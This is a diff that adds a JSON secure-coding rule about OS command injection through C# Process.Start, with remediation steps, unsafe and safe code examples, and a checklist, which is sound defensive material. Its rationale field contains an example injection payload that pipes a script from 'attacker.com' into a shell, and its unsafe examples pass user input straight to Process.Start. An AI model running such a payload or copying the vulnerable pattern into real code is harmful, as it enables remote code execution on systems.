@@ -1,0 +1,31 @@
+{
+  "rule_id": "SC-CSHARP-CMD-001",
+  "version": "1.0.0",
+  "title": "OS Command Injection via Process.Start",
+  "summary": "User-controlled input flows into Process.Start or the ProcessStartInfo constructor without validation. An attacker can inject arbitrary commands that run with the privileges of the application process.",
+
+  "why_it_matters": "Command injection gives an attacker the same privileges as the running process — often enough to read configuration, install backdoors, or pivot to internal networks. Automated exploitation is trivial: appending `; curl attacker.com/shell.sh | sh` to a vulnerable parameter is a textbook attack.",
+
+  "how_to_fix": "The safest fix is to eliminate shell invocation entirely. If you must execute external processes:\n\n1. Never pass user input directly to Process.Start with a single string argument.\n2. Use ProcessStartInfo with UseShellExecute = false and ArgumentList.Add for each argument so arguments are not re-parsed by the shell.\n3. Validate user input against a strict allowlist of permitted values before use.\n4. Prefer .NET APIs over shelling out (e.g., use System.IO.File and Directory instead of calling `cp` or `ls`).",
+
+  "unsafe_example": "// UNSAFE: user input becomes the command\nstring cmd = Request.Query[\"cmd\"];\nProcess.Start(cmd);\n\n// UNSAFE: shell invocation via FileName + Arguments concat\nvar psi = new ProcessStartInfo(\"cmd.exe\", \"/c \" + userInput);\nProcess.Start(psi);",
+
+  "safe_example": "// SAFE: explicit argument list, no shell, allowlist check\nstring name = Request.Query[\"name\"];\nif (!AllowedNames.Contains(name))\n    throw new SecurityException(\"disallowed name\");\n\nvar psi = new ProcessStartInfo(\"/usr/bin/mytool\")\n{\n    UseShellExecute = false,\n    RedirectStandardOutput = true\n};\npsi.ArgumentList.Add(\"--name\");\npsi.ArgumentList.Add(name);\nvar proc = Process.Start(psi);",
+
+  "developer_notes": "ProcessStartInfo.ArgumentList (added in .NET Core 2.1) passes arguments as a list rather than a single space-separated string, which avoids argument injection entirely. When you must use the Arguments property, quote user input carefully and understand that the Windows CreateProcess argument parsing rules differ from Unix.",
+
+  "verification_checklist": [
+    "User input is never passed as the FileName to Process.Start",
+    "User input is never concatenated into the Arguments string",
+    "ProcessStartInfo.UseShellExecute is false",
+    "Arguments are passed via ArgumentList when possible",
+    "Allowed commands or arguments are validated against a strict allowlist"
+  ],
+
+  "references": [
+    {"title": "CWE-78: OS Command Injection", "url": "https://cwe.mitre.org/data/definitions/78.html"},
+    {"title": "OWASP Top 10 A03:2021 Injection", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
+    {"title": "OWASP OS Command Injection Defense Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"},
+    {"title": "ProcessStartInfo.ArgumentList docs", "url": "https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist"}
+  ]
+}
